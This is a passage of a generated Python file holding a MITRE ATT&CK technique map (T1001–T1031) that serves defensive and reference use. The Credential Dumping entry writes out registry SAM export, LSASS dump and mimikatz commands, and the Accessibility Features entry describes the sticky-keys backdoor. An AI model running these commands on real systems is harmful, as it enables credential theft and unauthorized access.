# This file is generated using generate_attack_map.py script
# DO NOT EDIT! Re-run the script instead...

attack_map = {
 'T1001': {'attack_id': 'T1001',
           'categories': ['command-and-control'],
           'description': 'Command and control (C2) communications are hidden (but not necessarily encrypted) in an '
                          'attempt to make the content more difficult to discover or decipher and to make the '
                          'communication less conspicuous and hide commands from being seen. This encompasses many '
                          'methods, such as adding junk data to protocol traffic, using steganography, commingling '
                          'legitimate traffic with C2 communications traffic, or using a non-standard data encoding '
                          'system, such as a modified Base64 encoding for the message body of an HTTP request.',
           'name': 'Data Obfuscation',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1002': {'attack_id': 'T1002',
           'categories': ['exfiltration'],
           'description': 'An adversary may compress data (e.g., sensitive documents) that is collected prior to '
                          'exfiltration in order to make it portable and minimize the amount of data sent over the '
                          'network. The compression is done separately from the exfiltration channel and is performed '
                          'using a custom program or algorithm, or a more common compression library or utility such '
                          'as 7zip, RAR, ZIP, or zlib.',
           'name': 'Data Compressed',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1003': {'attack_id': 'T1003',
           'categories': ['credential-access'],
           'description': 'Credential dumping is the process of obtaining account login and password information, '
                          'normally in the form of a hash or a clear text password, from the operating system and '
                          'software. Credentials can then be used to perform\xa0Lateral Movement\xa0and access '
                          'restricted information.\n'
                          '\n'
                          'Several of the tools mentioned in this technique may be used by both adversaries and '
                          'professional security testers. Additional custom tools likely exist as well.\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          '#### SAM (Security Accounts Manager)\n'
                          '\n'
                          'The SAM is a database file that contains local accounts for the host, typically those found '
                          'with the ‘net user’ command. To enumerate the SAM database, system level access is '
                          'required.\n'
                          '\xa0\n'
                          'A number of tools can be used to retrieve the SAM file through in-memory techniques:\n'
                          '\n'
                          '* pwdumpx.exe \n'
                          '* [gsecdump](https://attack.mitre.org/software/S0008)\n'
                          '* [Mimikatz](https://attack.mitre.org/software/S0002)\n'
                          '* secretsdump.py\n'
                          '\n'
                          'Alternatively, the SAM can be extracted from the Registry with '
                          '[Reg](https://attack.mitre.org/software/S0075):\n'
                          '\n'
                          '* <code>reg save HKLM\\sam sam</code>\n'
                          '* <code>reg save HKLM\\system system</code>\n'
                          '\n'
                          'Creddump7 can then be used to process the SAM database locally to retrieve hashes. '
                          '(Citation: GitHub Creddump7)\n'
                          '\n'
                          'Notes:\n'
                          'Rid 500 account is the local, in-built administrator.\n'
                          'Rid 501 is the guest account.\n'
                          'User accounts start with a RID of 1,000+.\n'
                          '\n'
                          '#### Cached Credentials\n'
                          '\n'
                          'The DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches '
                          'credentials when the domain controller is unavailable. The number of default cached '
                          'credentials varies, and this number can be altered per system. This hash does not allow '
                          'pass-the-hash style attacks.\n'
                          '\xa0\n'
                          'A number of tools can be used to retrieve the SAM file through in-memory techniques.\n'
                          '\n'
                          '* pwdumpx.exe \n'
                          '* [gsecdump](https://attack.mitre.org/software/S0008)\n'
                          '* [Mimikatz](https://attack.mitre.org/software/S0002)\n'
                          '\n'
                          'Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to '
                          'gather the credentials.\n'
                          '\n'
                          'Notes:\n'
                          'Cached credentials for Windows Vista are derived using PBKDF2.\n'
                          '\n'
                          '#### Local Security Authority (LSA) Secrets\n'
                          '\n'
                          'With SYSTEM access to a host, the LSA secrets often allows trivial access from a local '
                          'account to domain-based account credentials. The Registry is used to store the LSA '
                          'secrets.\n'
                          '\xa0\n'
                          'When services are run under the context of local or domain users, their passwords are '
                          'stored in the Registry. If auto-logon is enabled, this information will be stored in the '
                          'Registry as well.\n'
                          '\xa0\n'
                          'A number of tools can be used to retrieve the SAM file through in-memory techniques.\n'
                          '\n'
                          '* pwdumpx.exe \n'
                          '* [gsecdump](https://attack.mitre.org/software/S0008)\n'
                          '* [Mimikatz](https://attack.mitre.org/software/S0002)\n'
                          '* secretsdump.py\n'
                          '\n'
                          'Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to '
                          'gather the credentials.\n'
                          '\n'
                          'Notes:\n'
                          'The passwords extracted by his mechanism are\xa0UTF-16\xa0encoded, which means that they '
                          'are returned in\xa0plaintext.\n'
                          'Windows 10 adds protections for LSA Secrets described in Mitigation.\n'
                          '\n'
                          '#### NTDS from Domain Controller\n'
                          '\n'
                          'Active Directory stores information about members of the domain including devices and users '
                          'to verify credentials and define access rights. The Active Directory domain database is '
                          'stored in the NTDS.dit file. By default the NTDS file will be located in '
                          '%SystemRoot%\\NTDS\\Ntds.dit of a domain controller. (Citation: Wikipedia Active '
                          'Directory)\n'
                          ' \n'
                          'The following tools and techniques can be used to enumerate the NTDS file and the contents '
                          'of the entire Active Directory hashes.\n'
                          '\n'
                          '* Volume Shadow Copy\n'
                          '* secretsdump.py\n'
                          '* Using the in-built Windows tool, ntdsutil.exe\n'
                          '* Invoke-NinjaCopy\n'
                          '\n'
                          '#### Group Policy Preference (GPP) Files\n'
                          '\n'
                          'Group Policy Preferences (GPP) are tools that allowed administrators to create domain '
                          'policies with embedded credentials. These policies, amongst other things, allow '
                          'administrators to set local accounts.\n'
                          '\n'
                          'These group policies are stored in SYSVOL on a domain controller, this means that any '
                          'domain user can view the SYSVOL share and decrypt the password (the AES private key was '
                          'leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)\n'
                          '\n'
                          'The following tools and scripts can be used to gather and decrypt the password file from '
                          'Group Policy Preference XML files:\n'
                          '\n'
                          '* Metasploit’s post exploitation module: "post/windows/gather/credentials/gpp"\n'
                          '* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)\n'
                          '* gpprefdecrypt.py\n'
                          '\n'
                          'Notes:\n'
                          'On the SYSVOL share, the following can be used to enumerate potential XML files.\n'
                          'dir /s * .xml\n'
                          '\n'
                          '#### Service Principal Names (SPNs)\n'
                          '\n'
                          'See [Kerberoasting](https://attack.mitre.org/techniques/T1208).\n'
                          '\n'
                          '#### Plaintext Credentials\n'
                          '\n'
                          'After a user logs on to a system, a variety of credentials are generated and stored in '
                          'the\xa0Local Security Authority Subsystem Service\xa0(LSASS) process in memory. These '
                          'credentials can be harvested by a administrative user or SYSTEM.\n'
                          '\n'
                          'SSPI (Security Support Provider Interface) functions as a common interface to several '
                          'Security Support Providers (SSPs):\xa0A Security Support Provider is a\xa0dynamic-link '
                          'library\xa0(DLL) that makes one or more security packages available to applications.\n'
                          '\n'
                          'The following SSPs can be used to access credentials:\n'
                          '\n'
                          'Msv: Interactive logons, batch logons, and service logons are done through the MSV '
                          'authentication package.\n'
                          'Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer '
                          'Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: '
                          'TechNet Blogs Credential Protection)\n'
                          'Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and '
                          'later.\n'
                          'CredSSP: \xa0Provides SSO and\xa0Network Level Authentication\xa0for\xa0Remote Desktop '
                          'Services. (Citation: Microsoft CredSSP)\n'
                          '\xa0\n'
                          'The following tools can be used to enumerate credentials:\n'
                          '\n'
                          '* [Windows Credential Editor](https://attack.mitre.org/software/S0005)\n'
                          '* [Mimikatz](https://attack.mitre.org/software/S0002)\n'
                          '\n'
                          'As well as in-memory techniques, the LSASS process memory can be dumped from the target '
                          'host and analyzed on a local system.\n'
                          '\n'
                          'For example, on the target host use procdump:\n'
                          '\n'
                          '* <code>procdump -ma lsass.exe lsass_dump</code>\n'
                          '\n'
                          'Locally, mimikatz can be run:\n'
                          '\n'
                          '* <code>sekurlsa::Minidump\xa0lsassdump.dmp</code>\n'
                          '* <code>sekurlsa::logonPasswords</code>\n'
                          '\n'
                          '#### DCSync\n'
                          '\n'
                          'DCSync is a variation on credential dumping which can be used to acquire sensitive '
                          'information from a domain controller. Rather than executing recognizable malicious code, '
                          "the action works by abusing the domain controller's  application programming interface "
                          '(API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: '
                          'Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a '
                          'remote domain controller. Any members of the Administrators, Domain Admins, Enterprise '
                          'Admin groups or computer accounts on the domain controller are able to run DCSync to pull '
                          'password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may '
                          'include current and historical hashes of potentially useful accounts such as KRBTGT and '
                          'Administrators. The hashes can then in turn be used to create a Golden Ticket for use in '
                          '[Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz '
                          "and DCSync) or change an account's password as noted in [Account "
                          'Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat '
                          'ChangeNTLM July 2017) DCSync functionality has been included in the "lsadump" module in '
                          'Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which '
                          'performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)\n'
                          '\n'
                          '### Linux\n'
                          '\n'
                          '#### Proc filesystem\n'
                          '\n'
                          'The /proc filesystem on Linux contains a great deal of information regarding the state of '
                          'the running operating system. Processes running with root privileges can use this facility '
                          'to scrape live memory of other running programs. If any of these programs store passwords '
                          'in clear text or password hashes in memory, these values can then be harvested for either '
                          'usage or brute force attacks, respectively. This functionality has been implemented in the '
                          '[MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by '
                          '[Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then '
                          'harvests passwords and hashes by looking for text strings and regex patterns for how given '
                          'applications such as Gnome Keyring, sshd, and Apache use memory to store such '
                          'authentication artifacts.',
           'name': 'Credential Dumping',
           'platforms': ['Windows', 'Linux', 'macOS']},
 'T1004': {'attack_id': 'T1004',
           'categories': ['persistence'],
           'description': 'Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the '
                          'secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in '
                          '<code>HKLM\\Software\\[Wow6432Node\\]Microsoft\\Windows '
                          'NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and '
                          'functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) \n'
                          '\n'
                          'Malicious modifications to these Registry keys may cause Winlogon to load and execute '
                          'malicious DLLs and/or executables. Specifically, the following subkeys have been known to '
                          'be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n'
                          '\n'
                          '* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n'
                          '* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed '
                          'when a user logs on\n'
                          '* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n'
                          '\n'
                          'Adversaries may take advantage of these features to repeatedly execute malicious code and '
                          'establish Persistence.',
           'name': 'Winlogon Helper DLL',
           'platforms': ['Windows']},
 'T1005': {'attack_id': 'T1005',
           'categories': ['collection'],
           'description': 'Sensitive data can be collected from local system sources, such as the file system or '
                          'databases of information residing on the system prior to Exfiltration.\n'
                          '\n'
                          'Adversaries will often search the file system on computers they have compromised to find '
                          'files of interest. They may do this using a [Command-Line '
                          'Interface](https://attack.mitre.org/techniques/T1059), such as '
                          '[cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with '
                          'the file system to gather information. Some adversaries may also use [Automated '
                          'Collection](https://attack.mitre.org/techniques/T1119) on the local system.',
           'name': 'Data from Local System',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1006': {'attack_id': 'T1006',
           'categories': ['defense-evasion'],
           'description': 'Windows allows programs to have direct access to logical volumes. Programs with direct '
                          'access may read and write files directly from the drive by analyzing file system data '
                          'structures. This technique bypasses Windows file access controls as well as file system '
                          'monitoring tools. (Citation: Hakobyan 2009)\n'
                          '\n'
                          'Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: '
                          'Github PowerSploit Ninjacopy)',
           'name': 'File System Logical Offsets',
           'platforms': ['Windows']},
 'T1007': {'attack_id': 'T1007',
           'categories': ['discovery'],
           'description': 'Adversaries may try to get information about registered services. Commands that may obtain '
                          'information about services using operating system utilities are "sc," "tasklist /svc" using '
                          '[Tasklist](https://attack.mitre.org/software/S0057), and "net start" using '
                          '[Net](https://attack.mitre.org/software/S0039), but adversaries may also use other tools as '
                          'well.',
           'name': 'System Service Discovery',
           'platforms': ['Windows']},
 'T1008': {'attack_id': 'T1008',
           'categories': ['command-and-control'],
           'description': 'Adversaries may use fallback or alternate communication channels if the primary channel is '
                          'compromised or inaccessible in order to maintain reliable command and control and to avoid '
                          'data transfer thresholds.',
           'name': 'Fallback Channels',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1009': {'attack_id': 'T1009',
           'categories': ['defense-evasion'],
           'description': 'Some security tools inspect files with static signatures to determine if they are known '
                          'malicious. Adversaries may add data to files to increase the size beyond what security '
                          'tools are capable of handling or to change the file hash to avoid hash-based blacklists.',
           'name': 'Binary Padding',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1010': {'attack_id': 'T1010',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get a listing of open application windows. Window listings could '
                          'convey information about how the system is used or give context to information collected by '
                          'a keylogger.\n'
                          '\n'
                          'In Mac, this can be done natively with a small '
                          '[AppleScript](https://attack.mitre.org/techniques/T1155) script.',
           'name': 'Application Window Discovery',
           'platforms': ['macOS', 'Windows']},
 'T1011': {'attack_id': 'T1011',
           'categories': ['exfiltration'],
           'description': 'Exfiltration could occur over a different network medium than the command and control '
                          'channel. If the command and control network is a wired Internet connection, the '
                          'exfiltration may occur, for example, over a WiFi connection, modem, cellular data '
                          'connection, Bluetooth, or another radio frequency (RF) channel. Adversaries could choose to '
                          'do this if they have sufficient access or proximity, and the connection might not be '
                          'secured or defended as well as the primary Internet-connected channel because it is not '
                          'routed through the same enterprise network.',
           'name': 'Exfiltration Over Other Network Medium',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1012': {'attack_id': 'T1012',
           'categories': ['discovery'],
           'description': 'Adversaries may interact with the Windows Registry to gather information about the system, '
                          'configuration, and installed software.\n'
                          '\n'
                          'The Registry contains a significant amount of information about the operating system, '
                          'configuration, software, and security. (Citation: Wikipedia Windows Registry) Some of the '
                          'information may help adversaries to further their operation within a network.',
           'name': 'Query Registry',
           'platforms': ['Windows']},
 'T1013': {'attack_id': 'T1013',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'A port monitor can be set through the  (Citation: AddMonitor) API call to set a DLL to be '
                          'loaded at startup. (Citation: AddMonitor) This DLL can be located in '
                          '<code>C:\\Windows\\System32</code> and will be loaded by the print spooler service, '
                          'spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. '
                          '(Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow '
                          'writing a fully-qualified pathname for that DLL to '
                          '<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. \n'
                          '\n'
                          'The Registry key contains entries for the following:\n'
                          '\n'
                          '* Local Port\n'
                          '* Standard TCP/IP Port\n'
                          '* USB Monitor\n'
                          '* WSD Port\n'
                          '\n'
                          'Adversaries can use this technique to load malicious code at startup that will persist on '
                          'system reboot and execute as SYSTEM.',
           'name': 'Port Monitors',
           'platforms': ['Windows']},
 'T1014': {'attack_id': 'T1014',
           'categories': ['defense-evasion'],
           'description': 'Rootkits are programs that hide the existence of malware by intercepting (i.e., '
                          '[Hooking](https://attack.mitre.org/techniques/T1179)) and modifying operating system API '
                          'calls that supply system information. (Citation: Symantec Windows Rootkits) Rootkits or '
                          'rootkit enabling functionality may reside at the user or kernel level in the operating '
                          'system or lower, to include a [Hypervisor](https://attack.mitre.org/techniques/T1062), '
                          'Master Boot Record, or the [System Firmware](https://attack.mitre.org/techniques/T1019). '
                          '(Citation: Wikipedia Rootkit)\n'
                          '\n'
                          'Adversaries may use rootkits to hide the presence of programs, files, network connections, '
                          'services, drivers, and other system components. Rootkits have been seen for Windows, Linux, '
                          'and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX '
                          'Rootkit)',
           'name': 'Rootkit',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1015': {'attack_id': 'T1015',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Windows contains accessibility features that may be launched with a key combination before '
                          'a user has logged in (for example, when the user is on the Windows logon screen). An '
                          'adversary can modify the way these programs are launched to get a command prompt or '
                          'backdoor without logging in to the system.\n'
                          '\n'
                          'Two common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, '
                          'launched when the shift key is pressed five times and '
                          '<code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key '
                          'combination is pressed. The sethc.exe program is often referred to as "sticky keys", and '
                          'has been used by adversaries for unauthenticated access through a remote desktop login '
                          'screen. (Citation: FireEye Hikit Rootkit)\n'
                          '\n'
                          'Depending on the version of Windows, an adversary may take advantage of these features in '
                          'different ways because of code integrity enhancements. In newer versions of Windows, the '
                          'replaced binary needs to be digitally signed for x64 systems, the binary must reside in '
                          '<code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection '
                          '(WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as '
                          'a potential workaround because it does not require the corresponding accessibility feature '
                          'binary to be replaced. Examples for both methods:\n'
                          '\n'
                          'For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 '
                          'and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) '
                          'may be replaced with "cmd.exe" (or another program that provides backdoor access). '
                          'Subsequently, pressing the appropriate key combination at the login screen while sitting at '
                          'the keyboard or when connected over [Remote Desktop '
                          'Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be '
                          'executed with SYSTEM privileges. (Citation: Tilbury 2014)\n'
                          '\n'
                          'For the debugger method on Windows Vista and later as well as Windows Server 2008 and '
                          'later, for example, a Registry key may be modified that configures "cmd.exe," or another '
                          'program that provides backdoor access, as a "debugger" for the accessibility program (e.g., '
                          '"utilman.exe"). After the Registry is modified, pressing the appropriate key combination at '
                          'the login screen while at the keyboard or when connected with RDP will cause the "debugger" '
                          'program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n'
                          '\n'
                          'Other accessibility features exist that may also be leveraged in a similar fashion: '
                          '(Citation: DEFCON2016 Sticky Keys)\n'
                          '\n'
                          '* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n'
                          '* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n'
                          '* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n'
                          '* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n'
                          '* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>',
           'name': 'Accessibility Features',
           'platforms': ['Windows']},
 'T1016': {'attack_id': 'T1016',
           'categories': ['discovery'],
           'description': 'Adversaries will likely look for details about the network configuration and settings of '
                          'systems they access or through information discovery of remote systems. Several operating '
                          'system administration utilities exist that can be used to gather this information. Examples '
                          'include [Arp](https://attack.mitre.org/software/S0099), '
                          '[ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), '
                          '[nbtstat](https://attack.mitre.org/software/S0102), and '
                          '[route](https://attack.mitre.org/software/S0103).',
           'name': 'System Network Configuration Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1017': {'attack_id': 'T1017',
           'categories': ['lateral-movement'],
           'description': 'Adversaries may deploy malicious software to systems within a network using application '
                          'deployment systems employed by enterprise administrators. The permissions required for this '
                          'action vary by system configuration; local credentials may be sufficient with direct access '
                          'to the deployment server, or specific domain credentials may be required. However, the '
                          'system may require an administrative account to log in or to perform software deployment.\n'
                          '\n'
                          'Access to a network-wide or enterprise-wide software deployment system enables an adversary '
                          'to have remote code execution on all systems that are connected to such a system. The '
                          'access may be used to laterally move to systems, gather information, or cause a specific '
                          'effect, such as wiping the hard drives on all endpoints.',
           'name': 'Application Deployment Software',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1018': {'attack_id': 'T1018',
           'categories': ['discovery'],
           'description': 'Adversaries will likely attempt to get a listing of other systems by IP address, hostname, '
                          'or other logical identifier on a network that may be used for Lateral Movement from the '
                          'current system. Functionality could exist within remote access tools to enable this, but '
                          'utilities available on the operating system could also be used. Adversaries may also use '
                          'local host files in order to discover the hostname to IP address mappings of remote '
                          'systems. \n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Examples of tools and commands that acquire this information include "ping" or "net view" '
                          'using [Net](https://attack.mitre.org/software/S0039). The contents of the '
                          '<code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> file can be viewed to gain insight '
                          'into the existing hostname to IP mappings on the system.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'Specific to Mac, the <code>bonjour</code> protocol to discover additional Mac-based systems '
                          'within the same broadcast domain. Utilities such as "ping" and others can be used to gather '
                          'information about remote systems. The contents of the <code>/etc/hosts</code> file can be '
                          'viewed to gain insight into existing hostname to IP mappings on the system.\n'
                          '\n'
                          '### Linux\n'
                          '\n'
                          'Utilities such as "ping" and others can be used to gather information about remote systems. '
                          'The contents of the <code>/etc/hosts</code> file can be viewed to gain insight into '
                          'existing hostname to IP mappings on the system.',
           'name': 'Remote System Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1019': {'attack_id': 'T1019',
           'categories': ['persistence'],
           'description': 'The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) '
                          'or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the '
                          'software interface between the operating system and hardware of a computer. (Citation: '
                          'Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)\n'
                          '\n'
                          'System firmware like BIOS and (U)EFI underly the functionality of a computer and may be '
                          'modified by an adversary to perform or assist in malicious activity. Capabilities exist to '
                          'overwrite the system firmware, which may give sophisticated adversaries a means to install '
                          'malicious firmware updates as a means of persistence on a system that may be difficult to '
                          'detect.',
           'name': 'System Firmware',
           'platforms': ['Windows']},
 'T1020': {'attack_id': 'T1020',
           'categories': ['exfiltration'],
           'description': 'Data, such as sensitive documents, may be exfiltrated through the use of automated '
                          'processing or [Scripting](https://attack.mitre.org/techniques/T1064) after being gathered '
                          'during Collection. \n'
                          '\n'
                          'When automated exfiltration is used, other exfiltration techniques likely apply as well to '
                          'transfer the information out of the network, such as [Exfiltration Over Command and Control '
                          'Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative '
                          'Protocol](https://attack.mitre.org/techniques/T1048).',
           'name': 'Automated Exfiltration',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1021': {'attack_id': 'T1021',
           'categories': ['lateral-movement'],
           'description': 'An adversary may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log '
                          'into a service specifically designed to accept remote connections, such as telnet, SSH, and '
                          'VNC. The adversary may then perform actions as the logged-on user.',
           'name': 'Remote Services',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1022': {'attack_id': 'T1022',
           'categories': ['exfiltration'],
           'description': 'Data is encrypted before being exfiltrated in order to hide the information that is being '
                          'exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by '
                          'a defender. The encryption is performed by a utility, programming library, or custom '
                          'algorithm on the data itself and is considered separate from any encryption performed by '
                          'the command and control or file transfer protocol. Common file archive formats that can '
                          'encrypt files are RAR and zip.\n'
                          '\n'
                          'Other exfiltration techniques likely apply as well to transfer the information out of the '
                          'network, such as [Exfiltration Over Command and Control '
                          'Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative '
                          'Protocol](https://attack.mitre.org/techniques/T1048)',
           'name': 'Data Encrypted',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1023': {'attack_id': 'T1023',
           'categories': ['persistence'],
           'description': 'Shortcuts or symbolic links are ways of referencing other files or programs that will be '
                          'opened or executed when the shortcut is clicked or executed by a system startup process. '
                          'Adversaries could use shortcuts to execute their tools for persistence. They may create a '
                          'new shortcut as a means of indirection that may use '
                          '[Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate '
                          'program. Adversaries could also edit the target path or entirely replace an existing '
                          'shortcut so their tools will be executed instead of the intended legitimate program.',
           'name': 'Shortcut Modification',
           'platforms': ['Windows']},
 'T1024': {'attack_id': 'T1024',
           'categories': ['command-and-control'],
           'description': 'Adversaries may use a custom cryptographic protocol or algorithm to hide command and '
                          'control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will '
                          'produce a very weak ciphertext.\n'
                          '\n'
                          'Custom encryption schemes may vary in sophistication. Analysis and reverse engineering of '
                          'malware samples may be enough to discover the algorithm and encryption key used.\n'
                          '\n'
                          'Some adversaries may also attempt to implement their own version of a well-known '
                          'cryptographic algorithm instead of using a known implementation library, which may lead to '
                          'unintentional errors. (Citation: F-Secure Cosmicduke)',
           'name': 'Custom Cryptographic Protocol',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1025': {'attack_id': 'T1025',
           'categories': ['collection'],
           'description': 'Sensitive data can be collected from any removable media (optical disk drive, USB memory, '
                          'etc.) connected to the compromised system prior to Exfiltration.\n'
                          '\n'
                          'Adversaries may search connected removable media on computers they have compromised to find '
                          'files of interest. Interactive command shells may be in use, and common functionality '
                          'within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. '
                          'Some adversaries may also use [Automated '
                          'Collection](https://attack.mitre.org/techniques/T1119) on removable media.',
           'name': 'Data from Removable Media',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1026': {'attack_id': 'T1026',
           'categories': ['command-and-control'],
           'description': 'Some adversaries may split communications between different protocols. There could be one '
                          'protocol for inbound command and control and another for outbound data, allowing it to '
                          'bypass certain firewall restrictions. The split could also be random to simply avoid data '
                          'threshold alerts on any one communication.',
           'name': 'Multiband Communication',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1027': {'attack_id': 'T1027',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may attempt to make an executable or file difficult to discover or analyze by '
                          'encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. '
                          'This is common behavior that can be used across different platforms and the network to '
                          'evade defenses.\n'
                          '\n'
                          'Payloads may be compressed, archived, or encrypted in order to avoid detection. These '
                          'payloads may be used during Initial Access or later to mitigate detection. Sometimes a '
                          "user's action may be required to open and [Deobfuscate/Decode Files or "
                          'Information](https://attack.mitre.org/techniques/T1140) for [User '
                          'Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to '
                          'input a password to open a password protected compressed/encrypted file that was provided '
                          'by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used '
                          'compressed or archived scripts, such as Javascript.\n'
                          '\n'
                          'Portions of files can also be encoded to hide the plain-text strings that would otherwise '
                          'help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) '
                          'Payloads may also be split into separate, seemingly benign files that only reveal malicious '
                          'functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n'
                          '\n'
                          'Adversaries may also obfuscate commands executed from payloads or directly via a '
                          '[Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, '
                          'aliases, characters, and other platform/language specific semantics can be used to evade '
                          'signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June '
                          '2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand '
                          'March 2017)\n'
                          '\n'
                          'Another example of obfuscation is through the use of steganography, a technique of hiding '
                          'messages or code in images, audio tracks, video clips, or text files. One of the first '
                          'known and reported adversaries that used steganography activity surrounding '
                          '[Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the '
                          "gathered information from a victim's system and hid it into an image followed by "
                          'exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an '
                          'adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide '
                          "PowerShell commands in an image file (png) and execute the code on a victim's system. In "
                          'this particular case the PowerShell code downloaded another obfuscated script to gather '
                          "intelligence from the victim's machine and communicate it back to the adversary. (Citation: "
                          'McAfee Malicious Doc Targets Pyeongchang Olympics)',
           'name': 'Obfuscated Files or Information',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1028': {'attack_id': 'T1028',
           'categories': ['execution', 'lateral-movement'],
           'description': 'Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that '
                          'allows a user to interact with a remote system (e.g., run an executable, modify the '
                          'Registry, modify services). (Citation: Microsoft WinRM) It may be called with the '
                          '<code>winrm</code> command or by any number of programs such as PowerShell. (Citation: '
                          'Jacobsen 2014)',
           'name': 'Windows Remote Management',
           'platforms': ['Windows']},
 'T1029': {'attack_id': 'T1029',
           'categories': ['exfiltration'],
           'description': 'Data exfiltration may be performed only at certain times of day or at certain intervals. '
                          'This could be done to blend traffic patterns with normal activity or availability.\n'
                          '\n'
                          'When scheduled exfiltration is used, other exfiltration techniques likely apply as well to '
                          'transfer the information out of the network, such as Exfiltration Over Command and Control '
                          'Channel and Exfiltration Over Alternative Protocol.',
           'name': 'Scheduled Transfer',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1030': {'attack_id': 'T1030',
           'categories': ['exfiltration'],
           'description': 'An adversary may exfiltrate data in fixed size chunks instead of whole files or limit '
                          'packet sizes below certain thresholds. This approach may be used to avoid triggering '
                          'network data transfer threshold alerts.',
           'name': 'Data Transfer Size Limits',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1031': {'attack_id': 'T1031',
           'categories': ['persistence'],
